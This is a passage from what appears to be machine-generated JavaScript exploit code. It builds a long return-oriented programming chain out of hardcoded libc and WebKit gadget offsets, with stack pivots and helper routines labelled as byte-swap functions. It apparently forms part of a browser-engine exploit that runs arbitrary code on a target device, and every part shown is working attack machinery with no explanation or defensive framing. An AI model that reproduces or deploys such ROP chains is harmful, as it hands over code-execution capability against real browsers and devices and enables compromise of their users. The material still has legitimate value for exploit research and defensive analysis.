libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
__swbuf_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1125936, //L1951
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1126008, //L1952
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L1952:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1126120, //L1955
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1126136, //L1956
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L1954:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1955:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L1956:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1126224, //L1958
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1126240, //L1959
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1126368, //L1962
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1126384, //L1963
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1126352, //L1961
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1126488, //L1964
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1126504, //L1965
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1126624, //L1966
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1126608, //L1967
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1126712, //L1969
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1126696, //L1968
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1126816, //L1970
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1126832, //L1971
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1126952, //L1972
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1126936, //L1973
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1127024, //L1974
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L1974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1127136, //L1977
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1127152, //L1978
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L1976:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1977:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L1978:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1127240, //L1980
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1127256, //L1981
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1127416, //L1984
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1127448, //L1986
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1127400, //L1983
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1127432, //L1985
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1127608, //L1990
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1127560, //L1987
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1127576, //L1988
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1987:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L1988:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1989:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1127744, //L1992
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1127760, //L1993
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1127728, //L1991
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1127864, //L1994
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1127880, //L1995
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1128000, //L1996
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1127984, //L1997
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1128088, //L1999
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1128072, //L1998
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1128192, //L2000
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1128208, //L2001
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1128328, //L2002
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1128312, //L2003
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1128400, //L2004
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1128512, //L2007
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1128528, //L2008
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
//L2006:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2007:
db([0, 0]); // 0x0
set_gadget(webkit_base+568675,); //pop r8
//L2008:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1128616, //L2010
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1128632, //L2011
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1128792, //L2016
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1128744, //L2013
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1128760, //L2014
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2013:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2015:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1128848, //L2017
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2017:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1128960, //L2019
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1128992, //L2021
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1128976, //L2020
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2019:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1129152, //L2025
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1129104, //L2022
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1129120, //L2023
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2022:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2023:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2024:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1129256, //L2027
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1129240, //L2026
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1129464, //L2032
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1129432, //L2030
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2030:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2031:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1129568, //L2034
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1129552, //L2033
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1129664, //L2036
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2035:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L2036:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1129752, //L2038
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1129768, //L2039
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224144, //mov ax, [rdi]
libc_base+764760, //pop rsi
ropchain+1129928, //L2044
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1129880, //L2041
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1129896, //L2042
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2041:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2042:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2043:
db([16, 0]); // 0x10
set_gadget(libc_base+759608,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+764760, //pop rsi
ropchain+1129984, //L2045
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+144605 //pop rdi
]);
//L2045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+478984, //sar edi, cl
libc_base+764760, //pop rsi
ropchain+1130096, //L2047
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1130128, //L2049
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1130112, //L2048
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2047:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1130288, //L2053
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1130240, //L2050
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1130256, //L2051
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2050:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2051:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2052:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1130392, //L2055
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1130376, //L2054
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+763368,); //pop rcx
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1130592, //L2060
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1130560, //L2058
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2058:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2059:
db([32, 0]); // 0x20
set_gadget(libc_base+759608,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1130696, //L2062
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1130680, //L2061
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1130808, //L2065
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1130776, //L2063
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2063:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2064:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1130872, //L2067
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+763368 //pop rcx
]);
//L2067:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1130928, //L2068
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2068:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760, //pop rsi
ropchain+1131080, //L2071
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131096, //L2072
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1131064, //L2070
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2070:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1131256, //L2076
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1131208, //L2073
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1131224, //L2074
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2073:
db([0, 0]); // 0x0
